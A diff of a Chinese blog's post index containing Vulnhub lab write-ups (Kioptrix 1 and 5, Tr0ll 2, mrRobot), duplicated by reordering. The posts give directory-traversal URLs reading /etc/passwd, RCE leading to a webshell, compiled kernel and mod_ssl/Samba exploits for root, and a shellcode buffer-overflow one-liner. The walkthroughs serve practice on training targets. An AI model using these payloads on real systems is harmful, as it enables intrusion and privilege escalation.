+<p>**—靶机操作系统用的<font color="red"><strong>FreeBSD 9.0.0</strong></font>—-<br><code>http://192.168.249.134/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</code>—<strong>读取aoache2-httpd.conf信息</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/10.png"></p>
+<p><strong>–我们正常访问8080端口显示forbidden需要修改Firefox的配置—</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/9.png"></p>
+<p><strong>–修改后即可访问–</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/11.png"></p>
+<h4 id="二、0x01漏洞利用-PhpTax-lt-0-8远程代码执行漏洞"><a href="#二、0x01漏洞利用-PhpTax-lt-0-8远程代码执行漏洞" class="headerlink" title="二、0x01漏洞利用(PhpTax &lt;=0.8远程代码执行漏洞)"></a>二、0x01漏洞利用(PhpTax &lt;=0.8远程代码执行漏洞)</h4><p><strong>查看exp并利用</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/12.png"></p>
+<p>—蚁剑连接—</p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/13.png"></p>
+<p><strong>—这里同样需要添加User-Agent头—</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/14.png"></p>
+<p><strong>—成功连接—</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/15.png"></p>
+<p><strong>–此时权限为www—</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/16.png"></p>
+<h4 id="二、0x02提权-FreeBSD9-0提权"><a href="#二、0x02提权-FreeBSD9-0提权" class="headerlink" title="二、0x02提权(FreeBSD9.0提权)"></a>二、0x02提权(FreeBSD9.0提权)</h4><p><strong>–搜一下FreeBSD9.0有无利用漏洞—</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/19.png"></p>
+<p><strong>—通过蚁剑上传—</strong><br><img src="/2021/12/12/Kioptrix-Level-5/20.png"></p>
+<p><code>gcc 28718.c -o 28718</code><strong>–先编译</strong></p>
+<p><code>aslistcmd</code></p>
+<p><code>ascmd /bin/sh</code> <strong>—/bin/sh执行命令</strong></p>
+<p><code>./28718</code>   <strong>–运行</strong></p>
+<p><strong>—成功root权限—</strong></p>
+<p><img src="/2021/12/12/Kioptrix-Level-5/21.png"></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
@@ -211,60 +265,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Kioptix Level 5</title>
-    <url>/2021/12/12/Kioptrix-Level-5/</url>
-    <content><![CDATA[<p><strong>靶机：192.168.249.134</strong><br><strong>kali:  192.168.249.132</strong></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>ufs:/dev/ada0p2</code>  —<strong>指定根分区启动系统 这样指定根分区启动成功</strong>    </p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/1.png"></p>
-<p><strong>–靶机变为login才算打开—</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/2.png"></p>
-<p><code>nmap -sV 192.168.249.134</code> <strong>—查看开放端口</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/3.png"></p>
-<p><strong>—访问下80端口—</strong><br><strong>&lt;查看源代码&gt;</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/4.png"></p>
-<p><strong>&lt;看到URL访问下&gt;</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/6.png"></p>
-<p><strong>—搜下有无<font color="red">pChart 2.1.3的漏洞</font>—</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/5.png"></p>
-<p><strong>&lt;貌似是个目录遍历漏洞和xss,看下exp怎么利用&gt;</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/7.png"><br><img src="/2021/12/12/Kioptrix-Level-5/8.png"></p>
-<p>先玩玩XSS,刚开始以为是反射型<br>测试了下,发现是存储型,插几次,访问这个session.php就会弹几次窗.</p>
-<h4 id="二、0x00漏洞利用-pChart-2-1-3目录遍历"><a href="#二、0x00漏洞利用-pChart-2-1-3目录遍历" class="headerlink" title="二、0x00漏洞利用(pChart 2.1.3目录遍历)"></a>二、0x00漏洞利用(pChart 2.1.3目录遍历)</h4><p><code>http://192.168.249.134/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</code>—<strong>读取/etc/passwd</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/18.png"></p>
-<p>**—靶机操作系统用的<font color="red"><strong>FreeBSD 9.0.0</strong></font>—-<br><code>http://192.168.249.134/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</code>—<strong>读取aoache2-httpd.conf信息</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/10.png"></p>
-<p><strong>–我们正常访问8080端口显示forbidden需要修改Firefox的配置—</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/9.png"></p>
-<p><strong>–修改后即可访问–</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/11.png"></p>
-<h4 id="二、0x01漏洞利用-PhpTax-lt-0-8远程代码执行漏洞"><a href="#二、0x01漏洞利用-PhpTax-lt-0-8远程代码执行漏洞" class="headerlink" title="二、0x01漏洞利用(PhpTax &lt;=0.8远程代码执行漏洞)"></a>二、0x01漏洞利用(PhpTax &lt;=0.8远程代码执行漏洞)</h4><p><strong>查看exp并利用</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/12.png"></p>
-<p>—蚁剑连接—</p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/13.png"></p>
-<p><strong>—这里同样需要添加User-Agent头—</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/14.png"></p>
-<p><strong>—成功连接—</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/15.png"></p>
-<p><strong>–此时权限为www—</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/16.png"></p>
-<h4 id="二、0x02提权-FreeBSD9-0提权"><a href="#二、0x02提权-FreeBSD9-0提权" class="headerlink" title="二、0x02提权(FreeBSD9.0提权)"></a>二、0x02提权(FreeBSD9.0提权)</h4><p><strong>–搜一下FreeBSD9.0有无利用漏洞—</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/19.png"></p>
-<p><strong>—通过蚁剑上传—</strong><br><img src="/2021/12/12/Kioptrix-Level-5/20.png"></p>
-<p><code>gcc 28718.c -o 28718</code><strong>–先编译</strong></p>
-<p><code>aslistcmd</code></p>
-<p><code>ascmd /bin/sh</code> <strong>—/bin/sh执行命令</strong></p>
-<p><code>./28718</code>   <strong>–运行</strong></p>
-<p><strong>—成功root权限—</strong></p>
-<p><img src="/2021/12/12/Kioptrix-Level-5/21.png"></p>
-]]></content>
-      <categories>
-        <category>Vulnhub系列</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Tr0ll 2</title>
     <url>/2021/12/18/Tr0ll-2/</url>
     <content><![CDATA[<p><strong>靶机：192.168.249.136</strong><br><strong>kali: 192.168.249.132</strong></p>
@@ -296,6 +296,42 @@
 <p><strong>exp:</strong><code>./r00t $(python -c &#39;print &quot;A&quot;*268 + &quot;\x80\xfb\xff\xbf&quot; + &quot;\x90&quot;*16 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;&#39;)</code></p>
 <p><img src="/2021/12/18/Tr0ll-2/19.png"></p>
 <p><strong>—成功root—</strong></p>
+]]></content>
+      <categories>
+        <category>Vulnhub系列</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kioptix Level 1</title>
+    <url>/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/</url>
+    <content><![CDATA[<p><em><strong><strong>靶机</strong>: 192.168.249.129<br><strong>kali</strong>: 192.168.249.132</strong></em></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p> <code>arp-scan -l</code> —<strong>使用网络接口IP地址和网络掩码,生成目标主机地址列表</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/1.png"></p>
+<p>靶机: 192.168.249.129</p>
+<p><code>nmap -sV 192.168.249.129</code> —<strong>查看开放端口</strong></p>
+<p><strong>信息</strong>:<font color="red"><strong>Apache/1.3.20、mod_ssl/2.8.4、OpenSSL/0.9.6b</strong></font></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/2.png"></p>
+<p><code>nikto -host http://192.168.249.129/</code> —<strong>开放80、443端口,深入探测</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/3.png"></p>
+<p>nikto扫到<font color="red"><strong>CVE-2002-0082(Apache Mod_SSL/Apache-SSL远程缓冲区溢出漏洞)</strong></font></p>
+<p><font color="red">443端口使用的mod_ssl服务版本为<strong>2.8.4</strong></font></p>
+<h4 id="二、0x01漏洞利用-mod-ssl-2-8-4"><a href="#二、0x01漏洞利用-mod-ssl-2-8-4" class="headerlink" title="二、0x01漏洞利用(mod_ssl-2.8.4)"></a>二、0x01漏洞利用(mod_ssl-2.8.4)</h4><p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/4.png"></p>
+<p><code>gcc -o exp 47080.c -lcrypto</code> —<strong>编译</strong></p>
+<p><code>./exp</code> —-<strong>查看下参数</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/7.png"></p>
+<p><code>./exp | grep apache-1.3.20</code>  —-<strong>找对应的版本</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/5.png"></p>
+<p><strong>测试发现攻击偏移量0x6b可以利用</strong><br><code>./exp 0x6b 192.168.249.129 443 -c 40-50</code>  —<strong>root权限</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/8.png"></p>
+<h4 id="三、0x02漏洞利用-Samba-2-2-1a"><a href="#三、0x02漏洞利用-Samba-2-2-1a" class="headerlink" title="三、0x02漏洞利用(Samba 2.2.1a)"></a>三、0x02漏洞利用(Samba 2.2.1a)</h4><p>msf对目标主机进行扫描，得到靶机smb版本为<strong>2.2.1a</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/9.png"></p>
+<p><code>searchsploit Samba 2.2</code> —<strong>找下有无可利用的漏洞</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/10.png"></p>
+<p><code>searchsploit -p 10.c</code> –<strong>寻找路径</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/11.png"></p>
+<p><code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c /root/桌面</code> –<strong>复制到桌面</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/12.png"></p>
+<p><code>gcc -o samba 10.c</code>—<strong>编译运行</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/13.png"></p>
+<p><strong>—–搞定—–</strong></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
@@ -338,42 +374,6 @@
 <p><code>nmap --interactive</code> <strong>–交互</strong></p>
 <p><code>!sh</code>  <strong>—成功root</strong></p>
 <p><img src="/2021/12/22/mrRobot/22.png"> </p>
-]]></content>
-      <categories>
-        <category>Vulnhub系列</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kioptix Level 1</title>
-    <url>/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/</url>
-    <content><![CDATA[<p><em><strong><strong>靶机</strong>: 192.168.249.129<br><strong>kali</strong>: 192.168.249.132</strong></em></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p> <code>arp-scan -l</code> —<strong>使用网络接口IP地址和网络掩码,生成目标主机地址列表</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/1.png"></p>
-<p>靶机: 192.168.249.129</p>
-<p><code>nmap -sV 192.168.249.129</code> —<strong>查看开放端口</strong></p>
-<p><strong>信息</strong>:<font color="red"><strong>Apache/1.3.20、mod_ssl/2.8.4、OpenSSL/0.9.6b</strong></font></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/2.png"></p>
-<p><code>nikto -host http://192.168.249.129/</code> —<strong>开放80、443端口,深入探测</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/3.png"></p>
-<p>nikto扫到<font color="red"><strong>CVE-2002-0082(Apache Mod_SSL/Apache-SSL远程缓冲区溢出漏洞)</strong></font></p>
-<p><font color="red">443端口使用的mod_ssl服务版本为<strong>2.8.4</strong></font></p>
-<h4 id="二、0x01漏洞利用-mod-ssl-2-8-4"><a href="#二、0x01漏洞利用-mod-ssl-2-8-4" class="headerlink" title="二、0x01漏洞利用(mod_ssl-2.8.4)"></a>二、0x01漏洞利用(mod_ssl-2.8.4)</h4><p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/4.png"></p>
-<p><code>gcc -o exp 47080.c -lcrypto</code> —<strong>编译</strong></p>
-<p><code>./exp</code> —-<strong>查看下参数</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/7.png"></p>
-<p><code>./exp | grep apache-1.3.20</code>  —-<strong>找对应的版本</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/5.png"></p>
-<p><strong>测试发现攻击偏移量0x6b可以利用</strong><br><code>./exp 0x6b 192.168.249.129 443 -c 40-50</code>  —<strong>root权限</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/8.png"></p>
-<h4 id="三、0x02漏洞利用-Samba-2-2-1a"><a href="#三、0x02漏洞利用-Samba-2-2-1a" class="headerlink" title="三、0x02漏洞利用(Samba 2.2.1a)"></a>三、0x02漏洞利用(Samba 2.2.1a)</h4><p>msf对目标主机进行扫描，得到靶机smb版本为<strong>2.2.1a</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/9.png"></p>
-<p><code>searchsploit Samba 2.2</code> —<strong>找下有无可利用的漏洞</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/10.png"></p>
-<p><code>searchsploit -p 10.c</code> –<strong>寻找路径</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/11.png"></p>
-<p><code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c /root/桌面</code> –<strong>复制到桌面</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/12.png"></p>
-<p><code>gcc -o samba 10.c</code>—<strong>编译运行</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/13.png"></p>
-<p><strong>—–搞定—–</strong></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
